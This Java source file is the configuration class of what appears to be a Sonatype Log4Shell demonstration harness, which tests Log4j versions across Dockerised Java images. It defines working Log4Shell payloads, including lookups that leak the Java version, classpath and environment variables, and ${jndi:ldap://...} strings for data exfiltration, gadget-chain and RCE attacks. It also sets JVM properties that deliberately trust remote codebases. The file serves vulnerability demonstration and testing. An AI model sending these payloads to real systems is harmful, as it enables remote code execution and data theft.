package com.sonatype.demo.log4shell.config;

import com.sonatype.demo.log4shell.*;
import com.sonatype.demo.log4shelldemo.helpers.DockerEnvironment;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;


public class Configuration {


    private static final String fatjars = "-jar-with-dependencies.jar";
    public static final String ANYJAR = ".jar";


    private static final Logger log = LoggerFactory.getLogger(FrontEnd.class);

    private final ConfigMap<LogVersion> logVersions = new ConfigMap<>();
    private final Map<String,LogVersion> logVersionsByName = new TreeMap<>();

    private final ConfigMap<Attack> attacks = new ConfigMap<>();
    private final Map<Integer,Attack> attacksByID = new TreeMap<>();

    private final ConfigMap<JavaVersion> javaVersions = new ConfigMap<>();
    private final Map<String,JavaVersion> javaVersionsByName = new TreeMap<>();
    private final ConfigMap<SystemProperty> vmProperties = new ConfigMap<>();

    private final Set<String> reportingProperties=new HashSet<>();
    private final Set<String> hints=new HashSet<>();

    private String runnerPath;

    public static Configuration loadConfig(File config) throws Exception {

        Configuration c = new Configuration();
        c.loadJarPaths();
        c.loadJavaLevels(config);
        c.loadAttacks();
        c.loadHints(config);
        c.loadVMProperties();

        c.reportingProperties.add("java.version");

        return c;
    }


    private void loadAttacks() {

        Attack a=Attack.buildAttack(AttackType.EXPOSE_JAVA_VERSION, "${sys:java.version}");
        a.addCheck(new AttackResult(ResultType.FAIL,AttackResult.ComparisionType.CONTAINS,"${sys:java.version}"));
        a.addCheck(AttackResult.SUCCEDED);
        addAttack(a);

        a=Attack.buildAttack(AttackType.EXPOSE_JAVA_CLASSPATH, "${sys:java.class.path}");
        a.addCheck(new AttackResult(ResultType.FAIL,AttackResult.ComparisionType.CONTAINS,"${sys:java.class.path}"));
        a.addCheck(AttackResult.SUCCEDED);
        addAttack(a);

        a=Attack.buildAttack(AttackType.EXPOSE_ENVVAR, "${env:MODE}");
        a.addCheck(new AttackResult(ResultType.FAIL,AttackResult.ComparisionType.CONTAINS,"${env:MODE}"));
        a.addCheck(AttackResult.SUCCEDED);
        addAttack(a);

        a=Attack.buildAttack(AttackType.EXPOSE_LOG4J_CONFIG, "${log4j:configLocation}");
        a.addCheck(new AttackResult(ResultType.SUCCESS,AttackResult.ComparisionType.CONTAINS,"runner.jar"));
        a.addCheck(AttackResult.FAILED);
        addAttack(a);

        a=Attack.buildAttack(AttackType.TRANSMIT_JAVA_VERSION, "${jndi:ldap://ldap.dev:1389/cn=version}");
        a.addCheck(new AttackResult(ResultType.PARTIAL,AttackResult.ComparisionType.CONTAINS,"sent us ${sys:java.version}"));
        a.addCheck(new AttackResult(ResultType.SUCCESS,AttackResult.ComparisionType.CONTAINS,"sent us "));
        a.addCheck(AttackResult.FAILED);
        addAttack(a);


        a=Attack.buildAttack(AttackType.GADGET_CHAIN, "${jndi:ldap://ldap.dev:1389/cn=gadget}");
        a.addCheck(new AttackResult(ResultType.PARTIAL,AttackResult.ComparisionType.CONTAINS,"cannot be cast"));
        a.addCheck(new AttackResult(ResultType.SUCCESS,AttackResult.ComparisionType.CONTAINS,"gadget-chain"));
        a.addCheck(AttackResult.FAILED);
        addAttack(a);

        a=Attack.buildAttack(AttackType.RCE, "${jndi:ldap://ldap.dev:1389/cn=rce}");
        a.addCheck(new AttackResult(ResultType.PARTIAL,AttackResult.ComparisionType.CONTAINS,"cannot be cast"));
        a.addCheck(new AttackResult(ResultType.PARTIAL,AttackResult.ComparisionType.CONTAINS,"Reference Class Name:"));
        a.addCheck(new AttackResult(ResultType.SUCCESS,AttackResult.ComparisionType.CONTAINS,"XXX"));
        a.addCheck(AttackResult.FAILED);
        addAttack(a);

        a=Attack.buildAttack(AttackType.HIDDEN_ATTACK, "${jndi:ldap://ldap.dev:1389/a}");
        a.addCheck(new AttackResult(ResultType.PARTIAL,AttackResult.ComparisionType.CONTAINS,"cannot be cast"));
        a.addCheck(new AttackResult(ResultType.PARTIAL,AttackResult.ComparisionType.CONTAINS,"Reference Class Name:"));
        a.addCheck(new AttackResult(ResultType.SUCCESS,AttackResult.ComparisionType.CONTAINS,"thank you for your data"));
        a.addCheck(AttackResult.FAILED);
        addAttack(a);


    }


    private void addAttack(Attack a) {
        int id=attacks.addEntry(a);
        attacksByID.put(id,a);
    }


    private void loadVMProperties() {
        SystemProperty p = new SystemProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        vmProperties.addEntry(p);
        p = new SystemProperty("com.sun.jndi.ldap.object.trustSerialData", "true");
        vmProperties.addEntry(p);
    }


    private void loadJavaLevels(File c) throws Exception {


        Set<String> localImages = DockerEnvironment.getLocalDockerImages();

        File config = new File(c, "javalevels.txt");
        List<String> lines = Files.readAllLines(config.toPath());

        for (String s : lines) {
            s = s.trim();
            JavaVersion jv = new JavaVersion(s);
            if (localImages.contains(s)) {
                javaVersions.addEntry(jv);
                javaVersionsByName.put(s,jv);
            } else {
                log.warn("Specified Java Image {} is not present in local cache ", s);
            }
        }


    }



   private  void loadHints(File c) throws IOException {

        File hintsFile=new File(c,"hints.txt");
        if(!hintsFile.exists()) return;

        List<String> lines= Files.readAllLines(hintsFile.toPath());

        for(String s:lines) {
            s=s.trim();
            hints.add(s);
        }

    }

    private void loadJarPaths() throws IOException {

        File current = new File(System.getProperty("user.dir"));

        log.info("searching for log jars in {}", current.getAbsolutePath());
        File driver = new File(current, "driver");

        File log4jversions = new File(driver, "log4jversions");
        List<Path> candidates = getCandidates(log4jversions, fatjars);
        registerLog4JJars(current, candidates);

       File runner = new File(driver, "runner");
        candidates = getCandidates(runner, ANYJAR);
        if (candidates == null || candidates.isEmpty()) {
            throw new RuntimeException("no candidate log packages found - run 'mvn package' first");
        }
        Path r = candidates.get(0);
        log.info("candidate runner path {}", r);
        runnerPath = relLoc(current, r.toFile());
        log.info("runner path {}", runnerPath);

    }


    private String relLoc(File first, File second) {
        String a = first.getAbsolutePath();
        String b = second.getAbsolutePath();
        String rel = b.substring(a.length());
        if (rel.startsWith("/")) rel = rel.substring(1);
        return rel;
    }

    private void registerLog4JJars(File current, List<Path> candidates) {

        for (Path p : candidates) {
            p = p.toAbsolutePath();
            File f = p.toFile();
            String name = f.getName();
            String version = name.substring(0, name.length() - fatjars.length());
            LogVersion lv = new LogVersion(version, relLoc(current, f));
            logVersions.addEntry(lv);
            logVersionsByName.put(lv.getVersion(), lv);

            log.info("log4j version {} = jar {}", version, lv.getVersion());

        }
    }

    private List<Path> getCandidates(File local, String suffix) throws IOException {
        List<Path> candidates;
        Path path = local.toPath();
        try (Stream<Path> pathStream = Files.find(path,
                Integer.MAX_VALUE,
                (p, basicFileAttributes) ->
                        p.getFileName().toString().toLowerCase().endsWith(suffix))
        ) {
            candidates = pathStream.collect(Collectors.toList());
        }
        return candidates;
    }

    public String getRunnerPath() {
        return runnerPath;
    }

    public List<LogVersion> getActiveLogVersions() {
      return logVersions.getActive();
    }

    public List<ConfigElement<Attack>> getActiveAttacks() {
        return attacks.getActiveElements();
    }

    public Collection<ConfigElement<LogVersion>> getAllLogVersions() {
        return logVersions.values();
    }

    public Collection<ConfigElement<SystemProperty>> getAllVMProperties() {
        return vmProperties.values();
    }

    public Collection<ConfigElement<JavaVersion>> getAllJavaVersions() {
        return javaVersions.values();
    }

    public String[] getSpecialistConsoleNames() {
        return new String[]{"ldap","dns"};
    }

    public Set<String> getHints() {
        return Collections.unmodifiableSet(hints);
    }

    public Collection<ConfigElement<Attack>> getAllAttacks() {
        return attacks.values();
    }



    public boolean toggleVersion(int id) { return  logVersions.toggle(id);}

    public boolean  toggleJavaVersion(int id) { return javaVersions.toggle(id);}

    public boolean  toggleAttack(int id) {
        return attacks.toggle(id);
    }

    public boolean toggleProperty(int property) {
        return vmProperties.toggle(property);
    }

    public JavaVersion getJavaVersion(String name) {
        return javaVersionsByName.get(name);
    }


    private List<Set<Integer>> generateCombos(Set<Integer> activeIDs) {

        List<Set<Integer>> results=new LinkedList<>();
        results.add(new HashSet<>()); // the empty set

        if(activeIDs!=null && !activeIDs.isEmpty()) {
            results.add(activeIDs);
        }

        return results;
    }

    public List<ConfigElement<Attack>> getAdhocAttack(String payload) {
        Attack a=Attack.buildSimpleMutatedAttack(AttackType.ADHOC,payload);
        ConfigElement<Attack> ce=new ConfigElement<>(a,0);
        List<ConfigElement<Attack>> l=new LinkedList<>();
        l.add(ce);
        return l;

    }


    public class RunnerConfig {

        private final JavaVersion jv;
        public List<LogVersion> logVersions;
        public List<SystemProperty> vmprops;
        public List<ConfigElement<Attack>> attacks;
        public Set<Integer> activeVMProperties;


        public RunnerConfig(JavaVersion jv) {
            this.jv=jv;
        }

        public String getImageName() {
            return jv.version;
        }

        public Set<String> getReportingPropertyNames() {
          return Collections.unmodifiableSet(reportingProperties);
        }

        public boolean hasVMProperties() {
            return vmprops!=null && !vmprops.isEmpty();
        }

        public List<SystemProperty> getVMProperties() {
            return Collections.unmodifiableList(vmprops);
        }

        public List<LogVersion> getLogVersions() {
            return Collections.unmodifiableList(logVersions);
        }

        public boolean hasLogVersions() {
            return logVersions!=null && !logVersions.isEmpty();
        }

        public boolean hasAttacks() {
            return attacks!=null && !attacks.isEmpty();
        }

        public List<ConfigElement<Attack>> getAttacks() {
            return Collections.unmodifiableList(attacks);
        }

        public LogVersion getLogVersion(String v) {
            return logVersionsByName.get(v);
        }

        public JavaVersion getJavaVersion() {
            return jv;
        }

        public Attack getAttack(int attackID) {
            return attacksByID.get(attackID);
        }


        public Collection<ConfigElement<Attack>> getAllAttacks() {
            return Configuration.this.attacks.values();
        }
    }

    public void generateRunnerConfigs(List<ConfigElement<Attack>> attacks,ConfigHandler h) {

        // for active system properties we'll try all combinations ..

        Set<Integer> activeIDs=vmProperties.getActiveIDs();
        List<Set<Integer>> activeCombos=generateCombos(activeIDs);

        for(Set<Integer> p:activeCombos) {
            for (JavaVersion jv : javaVersions.getActive()) {
                RunnerConfig rc = new RunnerConfig(jv);
                rc.activeVMProperties=p;
                rc.logVersions = logVersions.getActive();
                rc.vmprops = vmProperties.getActive();
                rc.attacks = attacks;
               h.handle(rc);
            }
        }


    }




}

